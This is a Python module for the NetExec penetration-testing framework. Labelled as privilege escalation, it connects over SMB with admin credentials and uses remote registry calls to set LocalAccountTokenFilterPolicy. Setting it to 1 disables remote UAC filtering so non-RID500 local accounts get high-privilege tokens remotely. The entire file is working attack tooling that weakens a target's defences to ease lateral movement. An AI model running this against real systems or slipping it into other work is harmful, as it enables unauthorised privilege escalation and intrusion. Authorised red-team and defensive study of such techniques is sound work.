from impacket.dcerpc.v5 import rrp
from impacket.examples.secretsdump import RemoteOperations
from nxc.helpers.misc import CATEGORY


class NXCModule:
    """Module by @Defte_"""
    name = "remote-uac"
    description = "Enable or disable remote UAC"
    supported_protocols = ["smb"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.action = None

    def options(self, context, module_options):
        """
        Enables UAC (prevent non RID500 account to get high priv token remotely)
        Disables UAC (allow non RID500 account to get high priv token remotely)

        ACTION:     "enable" or "disable" (required)
        """
        if "ACTION" not in module_options:
            context.log.fail("ACTION option not specified!")
            return

        if module_options["ACTION"].lower() not in ["enable", "disable"]:
            context.log.fail("ACTION must be either enable, disable or query")
            return
        self.action = module_options["ACTION"].lower()

    def on_admin_login(self, context, connection):
        try:
            remoteOps = RemoteOperations(connection.conn, False)
            remoteOps.enableRegistry()
            if remoteOps._RemoteOperations__rrp:
                ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
                regHandle = ans["phKey"]

                keyHandle = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")["phkResult"]

                # Checks if the key already exists or not
                try:
                    rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "LocalAccountTokenFilterPolicy\x00")
                except Exception as e:
                    if "ERROR_FILE_NOT_FOUND" in str(e):
                        context.log.debug("Registry key 'LocalAccountTokenFilterPolicy' does not exist, creating it")
                        ans = rrp.hBaseRegCreateKey(remoteOps._RemoteOperations__rrp, keyHandle, "LocalAccountTokenFilterPolicy\x00")

                # Disable remote UAC
                if self.action == "disable":
                    rrp.hBaseRegSetValue(remoteOps._RemoteOperations__rrp, keyHandle, "LocalAccountTokenFilterPolicy\x00", rrp.REG_DWORD, 1)
                    context.log.highlight("Remote UAC disabled")

                # Enable remote UAC
                if self.action == "enable":
                    rrp.hBaseRegSetValue(remoteOps._RemoteOperations__rrp, keyHandle, "LocalAccountTokenFilterPolicy\x00", rrp.REG_DWORD, 0)
                    context.log.highlight("Remote UAC enabled")

        except Exception as e:
            context.log.debug(f"Error {e}")
        finally:
            remoteOps.finish()
